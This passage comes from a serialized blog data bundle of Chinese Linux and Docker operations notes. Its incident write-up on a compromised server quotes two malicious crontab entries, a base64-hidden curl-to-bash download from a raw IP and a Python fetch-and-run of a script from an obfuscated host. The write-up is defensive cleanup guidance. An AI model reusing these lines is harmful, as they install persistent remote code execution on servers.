在运行时，任何规则的变更都不需要对防火墙规则列表进行重新加载，只需要将变更部分保存并更新运行即可。相对应的，当用户使用 iptables 添加规则时，如果想要让规则永久保存，需要执行命令 serivce iptables save（注：该命令的执行需要安装 iptables.serivces），才可以永久保存置配置文件中，并且在重启后，配置依旧存在。在整个过程中，iptables 会对防火墙的规则列表重读一遍，加载到内核。\n\n添加范围端口 如 5000-10000：\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\n重新载入\n\nfirewall-cmd --reload\n\n\n1\n\n\n查看\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\n删除\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# 但如果你需要开启 firewalld，那么请查看如下配置\n# 允许22端口访问\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# 重新载入一下防火墙设置，使设置生效\nfirewall-cmd --reload\n# 可通过如下命令查看是否生效\nfirewall-cmd --zone=public --query-port=22/tcp\n# 查看当前系统打开的所有端口\nfirewall-cmd --zone=public --list-ports\n# 关掉刚刚打开的22端口\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# 批量开放端口，如从100到500这之间的端口我们全部要打开\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# 限制IP为192.168.0.200的地址禁止访问80端口即禁止访问机器\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# 解除刚才被限制的192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# 限制10.0.0.0-10.0.0.255这一整个段的IP，禁止他们访问\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'# rpm\n\n在 linux 系统中，rpm（red hat package manager）是一种常见的软件包管理器，提供了方便的软件安装、升级和卸载功能。本文将详细介绍 rpm 的语法、实操和各种方法之间的区别及重点内容。\n\n# 安装\nrpm -ivh xxx.rpm\n\n# 可以查询到rpm包的名字\nrpm -q <关键字>\n\n# 删除特定rpm包\nrpm -e <包的名字>\n\n# 不检查依赖，直接删除rpm包\nrpm -e --nodeps <包的名字>\n\n# 删除所有相同名字的包， 并忽略依赖\nrpm -e --allmatches --nodeps <包的名字>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall 是 centos 7 版本后的自带防火墙管理工具，与 iptables 不同，firewall 是一款动态防火墙管理工具。所谓动态防火墙，是指 firewall 在运行时，任何规则的变更都不需要对防火墙规则列表进行重新加载，只需要将变更部分保存并更新运行即可。相对应的，当用户使用 iptables 添加规则时，如果想要让规则永久保存，需要执行命令 serivce iptables save（注：该命令的执行需要安装 iptables.serivces），才可以永久保存置配置文件中，并且在重启后，配置依旧存在。在整个过程中，iptables 会对防火墙的规则列表重读一遍，加载到内核。\n\n添加范围端口 如 5000-10000：\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\n重新载入\n\nfirewall-cmd --reload\n\n\n1\n\n\n查看\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\n删除\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# 但如果你需要开启 firewalld，那么请查看如下配置\n# 允许22端口访问\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# 重新载入一下防火墙设置，使设置生效\nfirewall-cmd --reload\n# 可通过如下命令查看是否生效\nfirewall-cmd --zone=public --query-port=22/tcp\n# 查看当前系统打开的所有端口\nfirewall-cmd --zone=public --list-ports\n# 关掉刚刚打开的22端口\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# 批量开放端口，如从100到500这之间的端口我们全部要打开\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# 限制ip为192.168.0.200的地址禁止访问80端口即禁止访问机器\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# 解除刚才被限制的192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# 限制10.0.0.0-10.0.0.255这一整个段的ip，禁止他们访问\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"Linux 22端口对外攻击解决",frontmatter:{title:"Linux 22端口对外攻击解决",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2305",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2305.Linux%2022%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3.html",relativePath:"01.运维/2300.linux/2305.Linux 22端口对外攻击解决.md",key:"v-62410f40",path:"/linux/2305/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'近日同事的服务器遭受到攻击，怀疑是由于上网环境不安全，服务器链接信息被劫持，植入病毒造成服务器告警，告警信息如下：\n\n警告\n\n您的账号（账号 ID: 100016685465，昵称：new）下的设备（IP：121.5.146.143），存在对其他服务器端口（TCP：22）的攻击行为，请您做好安全自查整改，并在 24 小时内停止上述行为。如逾期未处理，我们核实后将按相关法律法规和腾讯云服务协议要求对您停止服务。\n\n从告警信息可以看出是我们的服务器对外发起了攻击，后来对外访问得 22 端口被禁用，缓解了这个问题，但是没有从根本解决，接下来记录一下如何解决问题。首先你看到得自己的服务器状况一定是这样的\n\n\n\n面对进程占用我们可以 kill 掉，但还是会被重新启动，所以这种情况先检查是否有定时任务\n\n# 显示 crontab 任务。 \ncrontab -l \n# 如果有非法定时任务删除他 \ncrontab -r 任务\n\n\n1\n2\n3\n4\n\n\n但是我查看后同事的服务没有任何定时文件在执行，那我们需要查看 /etc/crontab 是否有非法定时任务\n\n* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8vMTQwLjk5LjMyLjQ4L2IyZjYyOC9jcm9uYi5zaAo=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\n以上内容可以看到有两个定时任务一直再跑，其中一个一直在下载文件并且执行，此时我们干掉这两个任务，我在注掉这两个任务提示我\n\n注意\n\n/etc/crontab" E514: write error (file system full?) 系统文件已满\n\n此时需要删除一些文件释放空间以对以上内容进行保存\n\n# 查看哪个文件占用较大可以删掉\ndu -sh 文件\n\n\n1\n2\n\n\n以上完成后，重新启动定时任务\n\nsystemctl restart crond.service\n\n\n1\n\n\n找到进程所在文件，删除文件，停止进程\n\nps -ef | grep 18732\n\n\n1\n\n\n以上操作下来如果还有问题，那么可能需要排查所运行的服务是否有异常，比如 docker 是否有重复容器被启动等',normalizedContent:'近日同事的服务器遭受到攻击，怀疑是由于上网环境不安全，服务器链接信息被劫持，植入病毒造成服务器告警，告警信息如下：\n\n警告\n\n您的账号（账号 id: 100016685465，昵称：new）下的设备（ip：121.5.146.143），存在对其他服务器端口（tcp：22）的攻击行为，请您做好安全自查整改，并在 24 小时内停止上述行为。如逾期未处理，我们核实后将按相关法律法规和腾讯云服务协议要求对您停止服务。\n\n从告警信息可以看出是我们的服务器对外发起了攻击，后来对外访问得 22 端口被禁用，缓解了这个问题，但是没有从根本解决，接下来记录一下如何解决问题。首先你看到得自己的服务器状况一定是这样的\n\n\n\n面对进程占用我们可以 kill 掉，但还是会被重新启动，所以这种情况先检查是否有定时任务\n\n# 显示 crontab 任务。 \ncrontab -l \n# 如果有非法定时任务删除他 \ncrontab -r 任务\n\n\n1\n2\n3\n4\n\n\n但是我查看后同事的服务没有任何定时文件在执行，那我们需要查看 /etc/crontab 是否有非法定时任务\n\n* * * * * root echo y3vybcatznnttcbodhrwoi8vmtqwljk5ljmyljq4l2iyzjyyoc9jcm9uyi5zaao=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\n以上内容可以看到有两个定时任务一直再跑，其中一个一直在下载文件并且执行，此时我们干掉这两个任务，我在注掉这两个任务提示我\n\n注意\n\n/etc/crontab" e514: write error (file system full?) 系统文件已满\n\n此时需要删除一些文件释放空间以对以上内容进行保存\n\n# 查看哪个文件占用较大可以删掉\ndu -sh 文件\n\n\n1\n2\n\n\n以上完成后，重新启动定时任务\n\nsystemctl restart crond.service\n\n\n1\n\n\n找到进程所在文件，删除文件，停止进程\n\nps -ef | grep 18732\n\n\n1\n\n\n以上操作下来如果还有问题，那么可能需要排查所运行的服务是否有异常，比如 docker 是否有重复容器被启动等',charsets:{cjk:!0}},{title:"Docker 概念、命令及Dockerfile介绍",frontmatter:{title:"Docker 概念、命令及Dockerfile介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/400",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/40.Docker/400.Docker%20%E6%A6%82%E5%BF%B5%E3%80%81%E5%91%BD%E4%BB%A4%E5%8F%8ADockerfile%E4%BB%8B%E7%BB%8D.html",relativePath:"01.运维/40.Docker/400.Docker 概念、命令及Dockerfile介绍.md",key:"v-7dd6a16f",path:"/docker/400/",headers:[{level:2,title:"1.docker的感念，docker是什么",slug:"_1-docker的感念-docker是什么",normalizedTitle:"1.docker 的感念，docker 是什么",charIndex:2},{level:2,title:"2.docker基础命令",slug:"_2-docker基础命令",normalizedTitle:"2.docker 基础命令",charIndex:228},{level:2,title:"3.修改已经存在容器的端口",slug:"_3-修改已经存在容器的端口",normalizedTitle:"3. 修改已经存在容器的端口",charIndex:1900},{level:2,title:"4.制作镜像的基本命令",slug:"_4-制作镜像的基本命令",normalizedTitle:"4. 制作镜像的基本命令",charIndex:2414},{level:3,title:"概念",slug:"概念",normalizedTitle:"概念",charIndex:2431},{level:3,title:"命令",slug:"命令",normalizedTitle:"命令",charIndex:239},{level:3,title:"配置Idea连接Docker",slug:"配置idea连接docker",normalizedTitle:"配置 idea 连接 docker",charIndex:4504},{level:3,title:"实战构建SpringBoot应用",slug:"实战构建springboot应用",normalizedTitle:"实战构建 springboot 应用",charIndex:4716},{level:2,title:"5. Docker 使用阿里云仓库或自建仓库",slug:"_5-docker-使用阿里云仓库或自建仓库",normalizedTitle:"5. docker 使用阿里云仓库或自建仓库",charIndex:5697},{level:3,title:"阿里云仓库",slug:"阿里云仓库",normalizedTitle:"阿里云仓库",charIndex:5709},{level:3,title:"自建仓库",slug:"自建仓库",normalizedTitle:"自建仓库",charIndex:5715},{level:2,title:"6. 上传DockerHub",slug:"_6-上传dockerhub",normalizedTitle:"6. 上传 dockerhub",charIndex:6101}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"1.docker的感念，docker是什么 2.docker基础命令 3.修改已经存在容器的端口 4.制作镜像的基本命令 概念 命令 配置Idea连接Docker 实战构建SpringBoot应用 5. Docker 使用阿里云仓库或自建仓库 阿里云仓库 自建仓库 6. 上传DockerHub",content:'# 1.docker 的感念，docker 是什么\n\ndocker 分为三种感念：镜像 容器 仓库\n镜像：类似于一个模板，里面包含了一些内容\n容器：容器是一个镜像的实例，如果理解镜像为一个 class，那么容器就被理解为是 new class (); 是镜像的实例\n仓库：就是下载镜像资源的地方。\ndocker 容器不是虚拟机，容器可以说是一个进程，我们可以给容器分配内存。就像 windows 安装了虚拟机，可以给虚拟机分配内存大小，磁盘空间。\n\n\n# 2.docker 基础命令\n\n搜索镜像，从 maven 仓库中查询\n\ndocker search mysql\n\n\n1\n\n\n列出当前系统存在的镜像\n\ndocker images\n\n\n1\n\n\n给镜像更换名称\n\ndocker tag imageId repository:tag\n\n\n1\n\n\n删除镜像 (-f 强制) 必须知道镜像的 imageId\n\ndocker rmi -f imageId\n\n\n1\n\n\nrepository:tag (镜像的仓库源：镜像的标签) 拉取\n\ndocker pull repository:tag\n\n\n1\n\n\n运行一个容器\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * run：运行容器命令\n * -it：运行后直接与终端交互，比如运行 jar 或其他应用的时候 查看他们的启动信息\n * -d：后台运行\n * -p port1:port2：端口映射 port1 (宿主机) port2 (容器) 容器的端口是可以重复的，所以容器和物理机的端口可以一致。rabbitmq 有两个端口 5672 和 15672 所以会用到双 -p repository:tag -> 如果不指定 tag，默认使用最新的\n * --name "xxx"：指定容器名称\n * -v /home/data:/data：/home/data (宿主机):/data (容器) 本地地址和容器地址产生挂载关系， 在容器内部该目录下，或者宿主机内部该目录下，修改文件、创建文件，彼此都会同步修改\n * --restart=always：总是运行，当重启 docker 后会自动运行起来\n * repository:tag：指定运行镜像的名称\n\n查看运行的容器\n\ndocker ps \n\n\n1\n\n\n查看所有状态的容器\n\ndocker ps -a\n\n\n1\n\n\n检查容器内部信息\n\ndocker inspect 容器名称|容器前12位id\n\n\n1\n\n\n停止容器\n\ndocker stop 容器名称|容器前12位id\n\n\n1\n\n\n开启容器运行\n\ndocker start 容器名称\n\n\n1\n\n\n删除容器之前必须先停止容器运行\n\ndocker rm 容器名称\n\n\n1\n\n\n查看容器日志\n\ndokcer logs -f 容器id\n\n\n1\n\n\n进入容器内部\n\ndocker exec -it mysql bash#  进入mysql内部\nmysql -uroot -p123456#  登录mysql服务 注意这里mysql -uroot -p123456 是连起来的\n\n\n1\n2\n\n\n把一个容器制作为一个新的镜像\n\ndocker commit \n -m="提交信息" \n -a="作者" \n 容器id\n 自定义镜像名称:[自定义标签名]\n\n\n1\n2\n3\n4\n5\n\n\n查看容器的信息\n\ndocker inspect 容器ID\n\n\n1\n\n\n对于没有私有仓库的要使服务器间共享一个 docker 镜像，可以先把某台机器上的进行先导出，然后其他服务器在导入即可\n\n# 导出\ndocker save \n 镜像ID\n -o /本地路径/文件.tar  这句话意思导出到你宿主机的一个地址，文件名随便起后缀为tar，路径要提前建好\n\n# 导入\ndocker load < /上传文件的地址/导出的文件名.tar\n\n# 查看导入的镜像\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n容器之间共享，容器 2 共用 容器 1\n\ndocker tun -it \n  -- name 容器2\n  --volumes-from 容器1(容器1必须已启动)\n  镜像名称\n\n\n1\n2\n3\n4\n\n\n查看制作镜像时叠加其他镜像的操作\n\ndocker history 镜像ID\n\n\n1\n\n\n\n# 3. 修改已经存在容器的端口\n\n1、停止容器 (docker stop d00254ce3af7)\n2、停止 docker 服务 (systemctl stop docker)\n3、修改这个容器的 hostconfig.json 文件中的端口（原帖有人提到，如果 config.v2.json 里面也记录了端口，也要修改）\n\ncd /var/lib/docker/containers/d00254ce3af7*    # 这里是CONTAINER ID\n\nvim hostconfig.json\n如果之前没有端口映射, 应该有这样的一段:\n"PortBindings":{}\n\n增加一个映射, 这样写:\n"PortBindings":{"8080/tcp":[{"HostIp":"","HostPort":"60000"}]}\n前一个数字是容器端口, 后一个是宿主机端口。将宿主机的60000端口映射到容器的8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4、启动 docker 服务 (systemctl start docker)\n5、启动容器 (docker start d00254ce3af7)\n\n\n# 4. 制作镜像的基本命令\n\n\n# 概念\n\n\n\nDockerfile 默认会把当前所在文件的上下问都发送给 Docker Server，最终制作成一个镜像，比如你得 DockerFile 在 linux 的根 (/) 目录，那么就会递归根目录下的所有文件，发送到 Docker Server 制作镜像，所以制作 Dockerfile 最好是在某一个地方新建文件夹去制作。制作过程都是依赖于一个个的镜像，所以会有缓存加速下次制作，如果不需要依赖缓存 可以在命令制作的最后面加 --no-cache\n\n.dockerIgnore 是用来忽略哪些文件或目录不参与到制作镜像中\n\n制作命令： docker build -f /home/docker/nginx/Dockerfile . -f 用来指定 Dockerfile 所在的位置，一般会使用 docker build -t nginx2 . -t 在当前目录制作镜像， nginx2 镜像的名字， . 代表 Dockerfile 就在当前目录\n\n\n# 命令\n\n指令            描述\nFROM          构建的新镜像是基于哪个镜像。例如：FROM centos:6，第一个指令必须是 FROM\nMAINTAINER    镜像维护者姓名或邮箱地址。例如：MAINTAINER Mr.chen\nRUN           构建镜像时运行的 Shell 命令。例如：RUN ["yum","install","httpd"] 也可以直接 RUN\n              yum install httpd 或者 RUN yum install httpd\nCMD           容器运行时执行的Shell命令 （编写的 dockerfile 中多个 cmd 都会执行，但默认保留最后一个命令，如果\n              docker run 运行时传递 command，会覆盖 cmd 的保留命令），启动容器会执行 CMD\n              的保留命令。例如：CMD ["-c","/start.sh"] 也可以是 CMD echo \'hello docker\'\nEXPOSE        声明容器运行的服务端口。例如：EXPOSE 80 443，但是默认都是 tcp 协议，如果想要暴漏 udp 协议，则是\n              EXPOSE 80/udp ，注意只能是 tcp 或 udp\nENV           设置容器内的环境变量。例如：ENV MYSQL_ROOT_PASSWORD 123456\nADD           将宿主机目录下的文件拷贝进镜像且 ADD 命令会自动处理 URL 和解压 tar 包 例如：ADD\n              ["src","dest"] 或者 ADD https://xxx.com/html.tar.gz\n              /var/www/html 或者：ADD html.tar.gz/var/www/html\nCOPY          拷贝文件或目录到镜像（不能自动解压缩）。例如：COPY ./start.sh/start.sh\nENTRYPOINT    运行容器时执行的 Shell 命令（不能被运行时传递的参数覆盖)，比 CMD 牛皮一些。例如：ENTRYPOINT\n              ["/bin/bash","-c","/start.sh"] 或者 ENTRYPOINT /bin/bash -c\n              "/start.sh"\nVOLUME        指定容器挂载点到宿主机自动生成的目录或其他容器 例如：VOLUME ["/var/lib/mysql"]\nUSER          为 RUN，CMD 和 ENTRYPOINT 执行命令指定运行用户 例如：USER Mr_chen\nWORKDIR       指定在创建容器后，终端默认登录进来的工作目录，一个落脚点 例如：WORKDIR /data， 该命令也会影响\n              ENTRYPOINT 运行例如jar包时的位置，默认会自带WORKDIR的路径\nHEALTHCHECK   健康检查。例如：HEALTHCHECK --interval=5m --timeout=3s --retries=3\n              CMD curl -f http://localhost/ exit 1\nARG           在构建镜像时指定一些参数。例如：ARG user\nONBUILD       当镜像被继承后触发在 ONBUILD 里写的命令，继承者直接使用 FROM 命令继承当前镜像的名称即可，在 build\n              的时候触发\n\n提示\n\n从 docker17.05 版本开始，dockerfile 中允许使用多个 FROM 指令\n\n\n# 配置 Idea 连接 Docker\n\n配置后方便我们把写好的 Docker File 直接打成镜像到 Docker 中，方便运行和管理\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1，加载docker守护线程\nsystemctl restart docker // 2，重启docker\n\n\n1\n2\n\n\n\n# 实战构建 SpringBoot 应用\n\n在应用的根目录中创建 Dockerfile，具体构建之前一定要了解 SpringBoot 配置文件的加载路径优先级，这里牵扯到我们在修改配置文件时，可以指定挂载外部文件修改后同步到容器，否则，每改一次都要重新制作镜像\n\n提示\n\nSpringBoot 配置文件的加载路径优先级：\n工程根目录:./config/\n工程根目录：./\nclasspath:/config/\nclasspath:/\n\n# 基础镜像\nFROM openjdk:8-jre-slim\n# 作者\nMAINTAINER biguncle\n# 配置\nENV PARAMS=""\nEXPOSE 8081\n# 时区\nENV TZ=Asia/Shanghai\nRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n# 添加应用\nADD ./target/tool-boot-0.0.1-SNAPSHOT.jar /server/tool-boot.jar\n# 创建一个工作目录，并将外部配置文件复制到镜像中\nRUN mkdir /server/config\nCOPY /src/main/resources/application.yml /app/config/\nWORKDIR /server\n## 在镜像运行为容器后执行的命令\nENTRYPOINT java -jar -Dpolyglot.engine.WarnInterpreterOnly=false tool-boot.jar  $PARAMS\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n执行命令\n\n#build 构建应用的镜像\ndocker build -f ./Dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\n运行容器\n\n#build 构建应用的镜像\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. Docker 使用阿里云仓库或自建仓库\n\n\n# 阿里云仓库\n\n 1. 先登录阿里云镜像服务，地址\n 2. 创建个人或企业实例\n 3. 创建镜像仓库，这个仓库可以建多个，看自己\n 4. 创建完毕之后可以根据阿里云提供的步骤进行推送或拉取\n\n\n\n如果我们只是想用阿里云的镜像加速器，可以找到如下图操作即可。\n\n\n\n\n# 自建仓库\n\n 1. 拉取仓库镜像\n\ndocker pull registry\n\n\n1\n\n 2. 运行镜像\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. 查看镜像信息\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. 上传 DockerHub\n\n 1. 首先保证你登录\n\ndocker login --username=xxxx\n\n\n1\n\n 2. 构建镜像\n\ndocker build -t 账号/应用名称 -f Dockerfile .\n\n\n1\n\n 3. 在 DockerHub 新建仓库 https://hub.docker.com/\n 4. 给镜像打一个 tag 标签\n\ndocker tag 账号/应用名称 账号/标签名称:标签版本\n\n\n1\n\n 5. 上传\n\ndocker push 账号/标签名称:标签版本\n\n\n1\n',normalizedContent:'# 1.docker 的感念，docker 是什么\n\ndocker 分为三种感念：镜像 容器 仓库\n镜像：类似于一个模板，里面包含了一些内容\n容器：容器是一个镜像的实例，如果理解镜像为一个 class，那么容器就被理解为是 new class (); 是镜像的实例\n仓库：就是下载镜像资源的地方。\ndocker 容器不是虚拟机，容器可以说是一个进程，我们可以给容器分配内存。就像 windows 安装了虚拟机，可以给虚拟机分配内存大小，磁盘空间。\n\n\n# 2.docker 基础命令\n\n搜索镜像，从 maven 仓库中查询\n\ndocker search mysql\n\n\n1\n\n\n列出当前系统存在的镜像\n\ndocker images\n\n\n1\n\n\n给镜像更换名称\n\ndocker tag imageid repository:tag\n\n\n1\n\n\n删除镜像 (-f 强制) 必须知道镜像的 imageid\n\ndocker rmi -f imageid\n\n\n1\n\n\nrepository:tag (镜像的仓库源：镜像的标签) 拉取\n\ndocker pull repository:tag\n\n\n1\n\n\n运行一个容器\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * run：运行容器命令\n * -it：运行后直接与终端交互，比如运行 jar 或其他应用的时候 查看他们的启动信息\n * -d：后台运行\n * -p port1:port2：端口映射 port1 (宿主机) port2 (容器) 容器的端口是可以重复的，所以容器和物理机的端口可以一致。rabbitmq 有两个端口 5672 和 15672 所以会用到双 -p repository:tag -> 如果不指定 tag，默认使用最新的\n * --name "xxx"：指定容器名称\n * -v /home/data:/data：/home/data (宿主机):/data (容器) 本地地址和容器地址产生挂载关系， 在容器内部该目录下，或者宿主机内部该目录下，修改文件、创建文件，彼此都会同步修改\n * --restart=always：总是运行，当重启 docker 后会自动运行起来\n * repository:tag：指定运行镜像的名称\n\n查看运行的容器\n\ndocker ps \n\n\n1\n\n\n查看所有状态的容器\n\ndocker ps -a\n\n\n1\n\n\n检查容器内部信息\n\ndocker inspect 容器名称|容器前12位id\n\n\n1\n\n\n停止容器\n\ndocker stop 容器名称|容器前12位id\n\n\n1\n\n\n开启容器运行\n\ndocker start 容器名称\n\n\n1\n\n\n删除容器之前必须先停止容器运行\n\ndocker rm 容器名称\n\n\n1\n\n\n查看容器日志\n\ndokcer logs -f 容器id\n\n\n1\n\n\n进入容器内部\n\ndocker exec -it mysql bash#  进入mysql内部\nmysql -uroot -p123456#  登录mysql服务 注意这里mysql -uroot -p123456 是连起来的\n\n\n1\n2\n\n\n把一个容器制作为一个新的镜像\n\ndocker commit \n -m="提交信息" \n -a="作者" \n 容器id\n 自定义镜像名称:[自定义标签名]\n\n\n1\n2\n3\n4\n5\n\n\n查看容器的信息\n\ndocker inspect 容器id\n\n\n1\n\n\n对于没有私有仓库的要使服务器间共享一个 docker 镜像，可以先把某台机器上的进行先导出，然后其他服务器在导入即可\n\n# 导出\ndocker save \n 镜像id\n -o /本地路径/文件.tar  这句话意思导出到你宿主机的一个地址，文件名随便起后缀为tar，路径要提前建好\n\n# 导入\ndocker load < /上传文件的地址/导出的文件名.tar\n\n# 查看导入的镜像\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n容器之间共享，容器 2 共用 容器 1\n\ndocker tun -it \n  -- name 容器2\n  --volumes-from 容器1(容器1必须已启动)\n  镜像名称\n\n\n1\n2\n3\n4\n\n\n查看制作镜像时叠加其他镜像的操作\n\ndocker history 镜像id\n\n\n1\n\n\n\n# 3. 修改已经存在容器的端口\n\n1、停止容器 (docker stop d00254ce3af7)\n2、停止 docker 服务 (systemctl stop docker)\n3、修改这个容器的 hostconfig.json 文件中的端口（原帖有人提到，如果 config.v2.json 里面也记录了端口，也要修改）\n\ncd /var/lib/docker/containers/d00254ce3af7*    # 这里是container id\n\nvim hostconfig.json\n如果之前没有端口映射, 应该有这样的一段:\n"portbindings":{}\n\n增加一个映射, 这样写:\n"portbindings":{"8080/tcp":[{"hostip":"","hostport":"60000"}]}\n前一个数字是容器端口, 后一个是宿主机端口。将宿主机的60000端口映射到容器的8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4、启动 docker 服务 (systemctl start docker)\n5、启动容器 (docker start d00254ce3af7)\n\n\n# 4. 制作镜像的基本命令\n\n\n# 概念\n\n\n\ndockerfile 默认会把当前所在文件的上下问都发送给 docker server，最终制作成一个镜像，比如你得 dockerfile 在 linux 的根 (/) 目录，那么就会递归根目录下的所有文件，发送到 docker server 制作镜像，所以制作 dockerfile 最好是在某一个地方新建文件夹去制作。制作过程都是依赖于一个个的镜像，所以会有缓存加速下次制作，如果不需要依赖缓存 可以在命令制作的最后面加 --no-cache\n\n.dockerignore 是用来忽略哪些文件或目录不参与到制作镜像中\n\n制作命令： docker build -f /home/docker/nginx/dockerfile . -f 用来指定 dockerfile 所在的位置，一般会使用 docker build -t nginx2 . -t 在当前目录制作镜像， nginx2 镜像的名字， . 代表 dockerfile 就在当前目录\n\n\n# 命令\n\n指令            描述\nfrom          构建的新镜像是基于哪个镜像。例如：from centos:6，第一个指令必须是 from\nmaintainer    镜像维护者姓名或邮箱地址。例如：maintainer mr.chen\nrun           构建镜像时运行的 shell 命令。例如：run ["yum","install","httpd"] 也可以直接 run\n              yum install httpd 或者 run yum install httpd\ncmd           容器运行时执行的shell命令 （编写的 dockerfile 中多个 cmd 都会执行，但默认保留最后一个命令，如果\n              docker run 运行时传递 command，会覆盖 cmd 的保留命令），启动容器会执行 cmd\n              的保留命令。例如：cmd ["-c","/start.sh"] 也可以是 cmd echo \'hello docker\'\nexpose        声明容器运行的服务端口。例如：expose 80 443，但是默认都是 tcp 协议，如果想要暴漏 udp 协议，则是\n              expose 80/udp ，注意只能是 tcp 或 udp\nenv           设置容器内的环境变量。例如：env mysql_root_password 123456\nadd           将宿主机目录下的文件拷贝进镜像且 add 命令会自动处理 url 和解压 tar 包 例如：add\n              ["src","dest"] 或者 add https://xxx.com/html.tar.gz\n              /var/www/html 或者：add html.tar.gz/var/www/html\ncopy          拷贝文件或目录到镜像（不能自动解压缩）。例如：copy ./start.sh/start.sh\nentrypoint    运行容器时执行的 shell 命令（不能被运行时传递的参数覆盖)，比 cmd 牛皮一些。例如：entrypoint\n              ["/bin/bash","-c","/start.sh"] 或者 entrypoint /bin/bash -c\n              "/start.sh"\nvolume        指定容器挂载点到宿主机自动生成的目录或其他容器 例如：volume ["/var/lib/mysql"]\nuser          为 run，cmd 和 entrypoint 执行命令指定运行用户 例如：user mr_chen\nworkdir       指定在创建容器后，终端默认登录进来的工作目录，一个落脚点 例如：workdir /data， 该命令也会影响\n              entrypoint 运行例如jar包时的位置，默认会自带workdir的路径\nhealthcheck   健康检查。例如：healthcheck --interval=5m --timeout=3s --retries=3\n              cmd curl -f http://localhost/ exit 1\narg           在构建镜像时指定一些参数。例如：arg user\nonbuild       当镜像被继承后触发在 onbuild 里写的命令，继承者直接使用 from 命令继承当前镜像的名称即可，在 build\n              的时候触发\n\n提示\n\n从 docker17.05 版本开始，dockerfile 中允许使用多个 from 指令\n\n\n# 配置 idea 连接 docker\n\n配置后方便我们把写好的 docker file 直接打成镜像到 docker 中，方便运行和管理\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1，加载docker守护线程\nsystemctl restart docker // 2，重启docker\n\n\n1\n2\n\n\n\n# 实战构建 springboot 应用\n\n在应用的根目录中创建 dockerfile，具体构建之前一定要了解 springboot 配置文件的加载路径优先级，这里牵扯到我们在修改配置文件时，可以指定挂载外部文件修改后同步到容器，否则，每改一次都要重新制作镜像\n\n提示\n\nspringboot 配置文件的加载路径优先级：\n工程根目录:./config/\n工程根目录：./\nclasspath:/config/\nclasspath:/\n\n# 基础镜像\nfrom openjdk:8-jre-slim\n# 作者\nmaintainer biguncle\n# 配置\nenv params=""\nexpose 